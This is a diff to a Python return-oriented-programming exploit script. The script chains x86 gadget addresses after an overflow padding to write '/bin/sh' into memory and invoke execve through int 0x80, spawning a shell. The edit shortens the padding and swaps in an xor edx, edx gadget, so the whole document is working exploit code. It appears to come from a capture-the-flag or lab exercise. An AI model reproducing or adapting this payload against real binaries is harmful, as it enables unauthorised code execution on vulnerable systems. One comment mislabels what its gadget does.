@@ -9,9 +9,10 @@ pop_edx = 0x0808b275 # pop edx ; xor eax, eax ; pop edi ; ret
 inc_eax = 0x0809d09e # inc eax ; ret
 int_80 = 0x080499a2 # int 0x80
 mov_edx_eax = 0x08080732 # mov dword ptr [edx], eax ; ret
+xor_edx_edx = 0x0807b169 # xor edx, edx ; mov eax, edx ; ret
 filler = 0x11111111
 # Padding goes here
-p = bytes('AAAAAAAAAAAAAAAABBBB', 'ascii')
+p = bytes('AAAAAAAAAAAABBBB', 'ascii')
  
 p += pack('<I', pop_edx) # write address of .data into edx
 p += pack('<I', data)
@@ -32,9 +33,7 @@ p += pack('<I', xor_eax_eax) # clear eax
 p += pack('<I', mov_edx_eax) # write null after /bin/sh
 p += pack('<I', pop_ecx) # write arguments into ecx
 p += pack('<I', data + 8)
-p += pack('<I', pop_edx) # write arguments into ecx
-p += pack('<I', data + 8)
-p += pack('<I', filler)
+p += pack('<I', xor_edx_edx) # write arguments into ecx
 p += pack('<I', xor_eax_eax) # set eax to 11 (execve)
 p += pack('<I', inc_eax)
 p += pack('<I', inc_eax)
